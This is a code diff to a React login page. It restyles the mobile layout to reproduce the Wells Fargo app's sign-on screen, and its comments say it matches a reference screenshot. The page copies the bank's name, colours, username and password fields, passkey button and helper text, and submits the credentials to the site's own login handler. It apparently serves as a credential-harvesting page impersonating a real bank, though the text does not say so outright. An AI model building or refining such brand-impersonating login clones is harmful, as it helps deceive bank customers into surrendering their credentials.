@@ -494,54 +494,54 @@ export default function LoginPage() {
     </div>
   );
 
-  // Mobile Layout (phones and tablets - below lg: breakpoint)
+  // Mobile Layout — matches Wells Fargo app reference screenshot
   const MobileLayout = () => (
     <div className="lg:hidden min-h-screen flex flex-col bg-white">
 
-      {/* ── Red header ── */}
-      <header className="bg-[#d71e28] flex items-center justify-between px-4 py-3">
-        {/* Empty left spacer to center the title */}
-        <div className="w-8" />
-        <h1
-          className="text-white font-bold tracking-widest text-xl"
-          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.18em" }}
+      {/* ── Header: red bar with centered WELLS FARGO + hamburger ── */}
+      <header className="bg-[#d71e28] flex items-center px-4" style={{ height: 52 }}>
+        <div className="flex-1" />
+        <span
+          className="text-white font-bold text-[17px] tracking-[0.16em]"
+          style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
         >
           WELLS FARGO
-        </h1>
-        {/* Hamburger icon */}
-        <button
-          type="button"
-          className="flex flex-col gap-[5px] p-1"
-          aria-label="Open menu"
-          data-testid="button-mobile-menu"
-        >
-          <span className="block w-6 h-[2px] bg-white rounded" />
-          <span className="block w-6 h-[2px] bg-white rounded" />
-          <span className="block w-6 h-[2px] bg-white rounded" />
-        </button>
+        </span>
+        <div className="flex-1 flex justify-end">
+          {/* Three-line hamburger matching screenshot */}
+          <button
+            type="button"
+            aria-label="Menu"
+            data-testid="button-mobile-menu"
+            className="flex flex-col justify-center gap-[5px] py-2"
+          >
+            <span className="block w-[22px] h-[2px] bg-white" />
+            <span className="block w-[22px] h-[2px] bg-white" />
+            <span className="block w-[22px] h-[2px] bg-white" />
+          </button>
+        </div>
       </header>
 
-      {/* ── Gold accent line ── */}
+      {/* ── Thin gold/yellow stripe ── */}
       <div className="h-[3px] bg-[#ffcd41]" />
 
-      {/* ── Main scrollable area ── */}
-      <main className="flex-1 bg-white">
-        <div className="w-full max-w-[420px] mx-auto px-5">
+      {/* ── Page body ── */}
+      <main className="flex-1 bg-white overflow-y-auto">
+        <div className="px-[18px] pt-7 pb-10">
 
-          {/* ── Greeting ── */}
+          {/* Greeting — large light serif, matches screenshot */}
           <h2
-            className="text-[38px] font-normal text-[#1a1a1a] text-center mt-8 mb-7 leading-tight"
+            className="text-[32px] font-normal text-[#111] text-center mb-6 leading-none"
             style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
             data-testid="text-greeting"
           >
             {greeting}
           </h2>
 
-          {/* ── Form ── */}
           <form onSubmit={form.handleSubmit(onSubmit)}>
 
-            {/* Username */}
-            <div className="mb-4">
+            {/* ── Username field ── */}
+            <div className="mb-[10px]">
               <input
                 {...form.register("username", { required: true })}
                 placeholder="Username"
@@ -549,58 +549,79 @@ export default function LoginPage() {
                 autoCapitalize="off"
                 autoCorrect="off"
                 spellCheck={false}
-                className="w-full h-[58px] px-4 text-[17px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-gray-500"
+                className="w-full px-[14px] text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
+                style={{
+                  height: 56,
+                  border: "1.5px solid #c8c8c8",
+                }}
                 data-testid="input-username"
               />
             </div>
 
-            {/* Password */}
-            <div className="mb-5 relative">
+            {/* ── Password field ── */}
+            <div className="mb-[14px] relative">
               <input
                 {...form.register("password", { required: true })}
                 type={showPassword ? "text" : "password"}
                 placeholder="Password"
                 autoComplete="current-password"
-                className="w-full h-[58px] px-4 pr-16 text-[17px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-gray-500"
+                className="w-full px-[14px] pr-[56px] text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
+                style={{
+                  height: 56,
+                  border: "1.5px solid #c8c8c8",
+                }}
                 data-testid="input-password"
               />
               <button
                 type="button"
                 onMouseDown={(e) => e.preventDefault()}
                 onClick={() => setShowPassword(!showPassword)}
-                className="absolute right-4 top-1/2 -translate-y-1/2 text-[#4338ca] font-semibold text-[15px]"
+                className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium"
                 data-testid="button-toggle-password"
               >
                 {showPassword ? "Hide" : "Show"}
               </button>
             </div>
 
-            {/* Save username checkbox */}
-            <div className="flex items-center gap-3 mb-2">
-              <input
-                type="checkbox"
-                id="mobileSaveUsername"
-                checked={saveUsername}
-                onChange={(e) => setSaveUsername(e.target.checked)}
-                className="w-[18px] h-[18px] border-2 border-gray-400 rounded-sm accent-gray-700 cursor-pointer flex-shrink-0"
+            {/* ── Save username row ── */}
+            <div className="flex items-center gap-[10px] mb-[8px]">
+              <div
+                className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
+                style={{ borderRadius: 3 }}
+                onClick={() => setSaveUsername(!saveUsername)}
                 data-testid="checkbox-save-username"
-              />
-              <label htmlFor="mobileSaveUsername" className="text-[16px] text-gray-800 cursor-pointer select-none">
+              >
+                {saveUsername && (
+                  <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
+                    <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                )}
+              </div>
+              <label
+                className="text-[15px] text-gray-800 cursor-pointer select-none"
+                onClick={() => setSaveUsername(!saveUsername)}
+              >
                 Save username
               </label>
             </div>
 
-            {/* Save username helper text */}
-            <p className="text-[13px] text-gray-500 leading-snug mb-7">
+            {/* ── Security helper text ── */}
+            <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
               To help keep your account secure, save your username only on devices that aren't used by other people.
             </p>
 
-            {/* ── Sign on button (gray pill) ── */}
-            <div className="flex justify-center mb-4">
+            {/* ── Sign on button — gray pill, centered ── */}
+            <div className="flex justify-center mb-[14px]">
               <button
                 type="submit"
                 disabled={loginMutation.isPending}
-                className="h-[52px] w-[220px] rounded-full bg-[#d5d5d5] text-gray-500 font-semibold text-[17px] transition-colors disabled:opacity-70"
+                className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
+                style={{
+                  height: 50,
+                  width: 220,
+                  backgroundColor: "#d0d0d0",
+                  color: "#888",
+                }}
                 data-testid="button-sign-on"
               >
                 {loginMutation.isPending ? "Signing on…" : "Sign on"}
@@ -609,47 +630,46 @@ export default function LoginPage() {
 
           </form>
 
-          {/* ── "or" divider ── */}
-          <div className="flex items-center justify-center mb-4">
-            <span className="text-[15px] text-gray-600">or</span>
-          </div>
+          {/* ── "or" separator ── */}
+          <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>
 
-          {/* ── Use a passkey button (white + dark border pill) ── */}
-          <div className="flex justify-center mb-4">
+          {/* ── Use a passkey button — white outlined pill ── */}
+          <div className="flex justify-center mb-[14px]">
             <button
               type="button"
               onClick={handleBiometricLogin}
               disabled={biometricLoading}
-              className="h-[52px] w-[220px] rounded-full bg-white border border-gray-800 text-gray-900 font-semibold text-[16px] flex items-center justify-center gap-2 transition-colors hover:bg-gray-50 disabled:opacity-70"
+              className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
+              style={{
+                height: 50,
+                width: 220,
+                border: "1.5px solid #222",
+              }}
               data-testid="button-passkey"
             >
-              {/* Passkey icon — person silhouette with key badge */}
-              <svg
-                viewBox="0 0 24 24"
-                className="w-[20px] h-[20px] flex-shrink-0 text-gray-800"
-                fill="currentColor"
-                aria-hidden="true"
-              >
-                <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z" />
-                <circle cx="19.5" cy="17" r="2.5" fill="#4338ca" />
-                <rect x="21.5" y="16.6" width="2.5" height="1.2" rx="0.4" fill="#4338ca" />
-                <rect x="23.2" y="17.4" width="1.2" height="1.4" rx="0.4" fill="#4338ca" />
+              {/* Passkey / person+key icon — matches screenshot */}
+              <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
+                <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4" />
+                <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round" />
+                <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4" />
+                <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round" />
+                <circle cx="15" cy="13.5" r="0.8" fill="#333" />
               </svg>
               {biometricLoading ? "Authenticating…" : "Use a passkey"}
             </button>
           </div>
 
-          {/* Passkey helper text */}
-          <p className="text-[13px] text-gray-600 leading-snug mb-10 px-1">
+          {/* ── Passkey helper text ── */}
+          <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
             Don't have one? Create a passkey after signing on and skip the password next time.
           </p>
 
-          {/* ── Forgot link ── */}
-          <div className="flex items-center justify-center gap-1 mb-10">
-            <span className="text-[#4338ca] text-[15px]">→</span>
+          {/* ── Forgot link — purple arrow + text, centered ── */}
+          <div className="flex items-center justify-center gap-[5px]">
+            <span className="text-[#4b3f9e] text-[15px]">→</span>
             <Link
               href="/forgot-password"
-              className="text-[#4338ca] text-[15px] hover:underline"
+              className="text-[#4b3f9e] text-[15px] hover:underline"
               data-testid="link-forgot"
             >
               Forgot username or password?
